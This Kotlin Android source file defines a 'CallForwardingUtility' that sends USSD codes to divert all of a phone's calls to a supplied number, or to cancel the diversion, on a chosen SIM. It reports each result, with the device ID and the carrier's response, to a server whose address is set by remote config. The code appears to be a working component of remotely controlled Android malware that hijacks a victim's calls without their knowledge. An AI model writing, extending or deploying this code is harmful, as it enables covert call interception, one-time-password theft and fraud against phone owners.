package com.example.test

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.telephony.TelephonyManager
import android.telephony.SubscriptionManager
import android.util.Log
import androidx.annotation.RequiresApi
import androidx.core.content.ContextCompat
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL

class CallForwardingUtility(
    private val context: Context,
    private val deviceId: String
) {

    companion object {
        private const val TAG = "CallForwardingUtility"
    }
    
    // ?? Use RemoteConfigManager for dynamic BASE_URL
    private val baseUrl: String
        get() = RemoteConfigManager.getBaseUrl()

    fun forwardCall(number: String, simSlot: Int): Boolean {
        return sendUssd("**21*$number#", simSlot)
    }

    fun deactivateCallForwarding(simSlot: Int): Boolean {
        return sendUssd("##21#", simSlot)
    }

    private fun sendUssd(ussdCode: String, simSlot: Int): Boolean {
        if (!hasPermission()) {
            Log.e(TAG, "Missing required permissions")
            sendResultToServer(false, "Missing required permissions")
            return false
        }

        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
            Log.e(TAG, "USSD requires API 26+")
            sendResultToServer(false, "Unsupported Android version")
            return false
        }

        return try {
            executeUssd(ussdCode, simSlot)
            true
        } catch (e: SecurityException) {
            Log.e(TAG, "Permission denied", e)
            sendResultToServer(false, "Permission denied")
            false
        } catch (e: Exception) {
            Log.e(TAG, "Failed to send USSD", e)
            sendResultToServer(false, "Exception: ${e.message}")
            false
        }
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private fun executeUssd(ussdCode: String, simSlot: Int) {
        val subManager = context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
        val sims = subManager.activeSubscriptionInfoList

        if (sims.isNullOrEmpty() || simSlot >= sims.size) {
            Log.e(TAG, "No valid SIM found")
            sendResultToServer(false, "No valid SIM found")
            return
        }

        val subId = sims[simSlot].subscriptionId
        val telephonyManager = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        val tm = telephonyManager.createForSubscriptionId(subId)

        tm.sendUssdRequest(ussdCode, object : TelephonyManager.UssdResponseCallback() {
            override fun onReceiveUssdResponse(
                telephonyManager: TelephonyManager,
                request: String,
                response: CharSequence
            ) {
                Log.d(TAG, "USSD success: $response")
                sendResultToServer(true, response.toString())
            }

            override fun onReceiveUssdResponseFailed(
                telephonyManager: TelephonyManager,
                request: String,
                failureCode: Int
            ) {
                Log.e(TAG, "USSD failed: $failureCode")
                sendResultToServer(false, "USSD failed with code: $failureCode")
            }
        }, Handler(Looper.getMainLooper()))
    }

    private fun hasPermission(): Boolean {
        return ContextCompat.checkSelfPermission(context, Manifest.permission.CALL_PHONE) ==
                PackageManager.PERMISSION_GRANTED &&
                ContextCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) ==
                PackageManager.PERMISSION_GRANTED
    }

    private fun sendResultToServer(isSuccess: Boolean, message: String) {
        Thread {
            try {
                val body = JSONObject().apply {
                    put("deviceId", deviceId)
                    put("success", isSuccess)
                    put("message", message)
                    put("simSlot", 0)
                }

                val url = URL("$baseUrl/devices/call-forwarding/result")
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("Content-Type", "application/json")
                conn.doOutput = true

                conn.outputStream.use { os ->
                    os.write(body.toString().toByteArray())
                    os.flush()
                }

                Log.d(TAG, "Result sent to server: $message")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to send result", e)
            }
        }.start()
    }
}